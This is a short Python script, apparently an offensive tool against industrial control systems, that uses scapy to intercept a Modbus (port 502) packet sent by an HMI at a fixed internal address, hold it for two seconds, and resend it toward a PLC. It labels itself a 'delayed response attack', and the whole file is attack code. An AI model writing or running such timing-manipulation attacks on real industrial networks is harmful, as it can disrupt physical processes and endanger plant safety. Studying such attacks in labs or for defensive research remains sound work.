#!/usr/bin/env python3
from scapy.all import *
import time

HMI_IP = "10.10.20.30"
DELAY = 2.0

def packet_callback(packet):
    print(f"Holding for {DELAY} seconds...")
    time.sleep(DELAY)
    
    print(f"Forwarding packet to PLC at {time.time()}.")
    sendp(packet, verbose=0, iface="eth0")

print("Waiting to intercept a packet from the HMI...")
sniff(filter=f"tcp and src host {HMI_IP} and port 502", stop_filter=packet_callback, iface="eth0", count=1)
print("Delayed response attack complete.")

